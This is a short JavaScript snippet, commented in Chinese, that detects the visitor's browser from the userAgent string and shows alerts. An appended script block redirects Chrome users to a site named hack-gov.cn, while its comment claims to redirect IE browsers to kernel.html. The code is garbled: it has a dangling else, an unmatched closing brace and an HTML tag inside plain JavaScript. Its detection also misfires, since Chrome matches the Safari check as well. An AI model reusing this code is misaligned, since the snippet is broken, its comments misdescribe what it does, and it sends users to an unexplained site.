var userAgent = navigator.userAgent; //取得浏览器的userAgent字符串
var isOpera = userAgent.indexOf("Opera") > -1;
//判断是否Opera浏览器
if (isOpera) {
    alert("Opera");
};
//判断是否Firefox浏览器
if (userAgent.indexOf("Firefox") > -1) {
    alert("FF");
} 
//判断是否Chrome浏览器
if (userAgent.indexOf("Chrome") > -1){
    alert("Chrome");
}
//判断是否Safari浏览器
if (userAgent.indexOf("Safari") > -1) {
    alert("Safari");
}
//判断是否IE浏览器
if (!!window.ActiveXObject || "ActiveXObject" in window) {
    alert("IE");
}; 
<script type="text/javascript">
  var isChrome = window.navigator.userAgent.indexOf("Chrome") !== -1;
  alert(isChrome);
  if (isChrome) {
    window.location = "https://www.hack-gov.cn/";//如果是IE内核跳转至kernel.html	
  } else 
}; 